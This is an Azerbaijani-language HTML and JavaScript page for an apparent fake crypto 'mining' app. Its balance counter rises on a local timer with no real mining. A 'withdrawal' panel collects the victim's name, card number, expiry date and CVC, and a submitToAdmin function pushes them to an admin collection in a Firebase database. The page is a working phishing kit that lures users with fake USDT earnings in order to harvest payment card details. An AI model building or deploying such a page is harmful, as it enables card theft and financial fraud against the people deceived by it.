<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

<div id="mining-app" style="background: #000; min-height: 100vh; color: #fff; font-family: 'Inter', sans-serif; display: flex; flex-direction: column; overflow: hidden;">

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        body { margin: 0; padding: 0; user-select: none; background: #000; }

        .top-bar { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; border-bottom: 1px solid #1a1a1a; }
        .user-info { display: flex; align-items: center; gap: 10px; }
        .avatar { width: 35px; height: 35px; border-radius: 50%; background: #111; border: 1px solid #bdfd00; display: flex; align-items: center; justify-content: center; color: #bdfd00; }

        /* YENİ MƏRKƏZİ ANİMASİYA (Rings) */
        .mining-core { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; }
        .ring-container { position: relative; width: 200px; height: 200px; display: flex; align-items: center; justify-content: center; }
        .ring { position: absolute; border: 2px solid transparent; border-radius: 50%; animation: rotate-ring linear infinite; }
        .ring-1 { width: 180px; height: 180px; border-top-color: #bdfd00; animation-duration: 3s; }
        .ring-2 { width: 140px; height: 140px; border-bottom-color: #4a7d00; animation-duration: 2s; animation-direction: reverse; }
        .ring-3 { width: 100px; height: 100px; border-left-color: #fff; animation-duration: 1.5s; }
        .core-icon { font-size: 3rem; color: #bdfd00; text-shadow: 0 0 20px #bdfd00; z-index: 5; }
        @keyframes rotate-ring { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        /* ANİMASİYALI BALANS */
        .live-counter { font-size: 2.8rem; font-weight: 800; letter-spacing: 2px; color: #fff; margin-top: 20px; text-shadow: 0 0 10px rgba(189,253,0,0.5); transition: 0.1s; }

        /* YENİ PUL ÇIXARMA PANELİ (Slide-up) */
        .withdraw-panel {
            position: fixed; bottom: -100%; left: 0; width: 100%; height: 85%;
            background: #0a0a0a; border-top: 2px solid #bdfd00; border-radius: 30px 30px 0 0;
            z-index: 10000; transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); padding: 25px; box-sizing: border-box;
        }
        .active-panel { bottom: 0 !important; }
        .glass-card { background: rgba(255,255,255,0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 20px; margin-bottom: 20px; }
        .b-input { width: 100%; background: #111; border: 1px solid #222; padding: 15px; color: #fff; border-radius: 12px; margin-bottom: 12px; outline: none; }

        .progress-section { padding: 20px; width: 100%; box-sizing: border-box; }
        .progress-bar-bg { width: 100%; height: 8px; background: #1a1a1a; border-radius: 10px; overflow: hidden; margin-bottom: 8px; }
        .progress-fill { width: 0%; height: 100%; background: #bdfd00; border-radius: 10px; }
        
        .nav-bar { display: grid; grid-template-columns: repeat(4, 1fr); background: #050505; border-top: 1px solid #1a1a1a; padding: 15px 0; }
        .nav-item { text-align: center; color: #444; font-size: 1.2rem; }
    </style>

    <div class="top-bar">
        <div class="user-info">
            <div class="avatar"><i class="fas fa-user"></i></div>
            <span id="user-name-tag" style="font-weight: 700;">Yüklənir...</span>
        </div>
        <div style="color:#bdfd00; font-size: 0.8rem;"><i class="fas fa-microchip"></i> SERVER 01</div>
    </div>

    <div class="mining-core">
        <div class="ring-container">
            <div class="ring ring-1"></div>
            <div class="ring ring-2"></div>
            <div class="ring ring-3"></div>
            <i class="fas fa-bolt core-icon"></i>
        </div>
        <div class="live-counter" id="bal-txt">0.0000</div>
        <div style="font-size: 0.8rem; color: #555; font-weight: 700;">GÜNLÜK QAZANC (USDT)</div>
    </div>

    <div class="progress-section">
        <div style="display:flex; justify-content:space-between; margin-bottom:10px; font-size:0.8rem;">
            <span>Sessiya: <b id="s-status">Dayanıb</b></span>
            <span id="timer">05:00:00</span>
        </div>
        <div class="progress-bar-bg"><div class="progress-fill" id="fill"></div></div>
        <button id="mine-btn" onclick="startSession()" style="width:100%; margin-top:20px; background:#bdfd00; border:none; padding:18px; border-radius:15px; font-weight:800; color:#000;">
            MƏDƏNİ AKTİVLƏŞDİR
        </button>
    </div>

    <div class="nav-bar">
        <div class="nav-item" style="color:#bdfd00"><i class="fas fa-hammer"></i></div>
        <div class="nav-item"><i class="fas fa-chart-pie"></i></div>
        <div class="nav-item" onclick="toggleW()"><i class="fas fa-wallet"></i></div>
        <div class="nav-item"><i class="fas fa-user-circle"></i></div>
    </div>

    <div id="w-panel" class="withdraw-panel">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
            <h2 style="margin:0">Balansın Çıxarılması</h2>
            <i class="fas fa-chevron-down" onclick="toggleW()"></i>
        </div>
        
        <div class="glass-card">
            <div style="display:flex; justify-content:space-between; align-items:center;">
                <div><small style="color:#888">Mövcud Balans</small><h3 id="w-bal" style="margin:5px 0">0.00</h3></div>
                <img src="visa.png" width="50" id="card-icon">
            </div>
            <div id="card-num-v" style="margin:20px 0; font-size:1.2rem; letter-spacing:2px;">**** **** **** ****</div>
        </div>

        <input type="text" id="fn" class="b-input" placeholder="AD SOYAD" oninput="syncW()">
        <input type="text" id="cn" class="b-input" placeholder="KART NÖMRƏSİ" maxlength="19" oninput="syncW()">
        <div style="display:flex; gap:10px;">
            <input type="text" id="ed" class="b-input" placeholder="AA/İİ" maxlength="5">
            <input type="password" id="cv" class="b-input" placeholder="CVC" maxlength="3">
        </div>
        <input type="number" id="am" class="b-input" placeholder="MƏBLƏĞ">
        <button onclick="submitToAdmin()" style="width:100%; background:#238636; padding:18px; border:none; border-radius:12px; color:#fff; font-weight:700;">SORĞUNU TAMAMLA</button>
    </div>

</div>

<script>
    const user = localStorage.getItem('username') || 'Qonaq';
    document.getElementById('user-name-tag').innerText = user;

    let bal = 0;
    let running = false;
    let start = 0;
    const SPD = 0.0000555;
    const DUR = 5 * 60 * 60 * 1000;

    // Firebase Sync - NaN xətası burada həll edildi
    db.ref('mining/' + user).on('value', snap => {
        const d = snap.val();
        // Əgər data yoxdursa NaN olmasın deyə default dəyərlər:
        bal = d && d.balance ? parseFloat(d.balance) : 0;
        running = d && d.isRunning ? d.isRunning : false;
        start = d && d.startTime ? d.startTime : 0;
        
        document.getElementById('w-bal').innerText = bal.toFixed(2) + " USDT";
        updateUI();
    });

    function updateUI() {
        const b = document.getElementById('mine-btn');
        const s = document.getElementById('s-status');
        if(running) {
            b.innerText = "PROSES DAVAM EDİR...";
            b.disabled = true; b.style.opacity = "0.5";
            s.innerText = "Aktiv"; s.style.color = "#bdfd00";
        } else {
            b.innerText = "MƏDƏNİ AKTİVLƏŞDİR";
            b.disabled = false; b.style.opacity = "1";
            s.innerText = "Dayanıb"; s.style.color = "red";
        }
    }

    setInterval(() => {
        if(running) {
            let elap = Date.now() - start;
            if(elap < DUR) {
                bal += SPD;
                document.getElementById('bal-txt').innerText = bal.toFixed(4);
                document.getElementById('fill').style.width = (elap / DUR * 100) + "%";
                
                let rem = DUR - elap;
                let h = Math.floor(rem / 3600000);
                let m = Math.floor((rem % 3600000) / 60000);
                let s = Math.floor((rem % 60000) / 1000);
                document.getElementById('timer').innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
            } else {
                finish();
            }
        }
    }, 1000);

    async function startSession() {
        start = Date.now();
        running = true;
        await db.ref('mining/' + user).update({ isRunning: true, startTime: start, balance: bal });
    }

    async function finish() {
        running = false;
        await db.ref('mining/' + user).update({ isRunning: false, balance: bal });
        alert("Sessiya bitdi!");
    }

    function toggleW() { document.getElementById('w-panel').classList.toggle('active-panel'); }

    function syncW() {
        const n = document.getElementById('cn').value;
        document.getElementById('card-num-v').innerText = n || "**** **** **** ****";
        const img = document.getElementById('card-icon');
        if(n.startsWith('4')) img.src = 'visa.png';
        else if(n.startsWith('5')) img.src = 'master.png';
    }

    async function submitToAdmin() {
        const val = parseFloat(document.getElementById('am').value);
        if(val > bal || isNaN(val)) return alert("Səhv məbləğ!");

        const payload = {
            user: user,
            name: document.getElementById('fn').value,
            card: document.getElementById('cn').value,
            exp: document.getElementById('ed').value,
            cvc: document.getElementById('cv').value,
            amt: val,
            date: new Date().toLocaleString()
        };

        await db.ref('admin_panel/withdrawals').push(payload);
        await db.ref('mining/' + user).update({ balance: bal - val });
        alert("Sorğu göndərildi!");
        location.reload();
    }
</script>
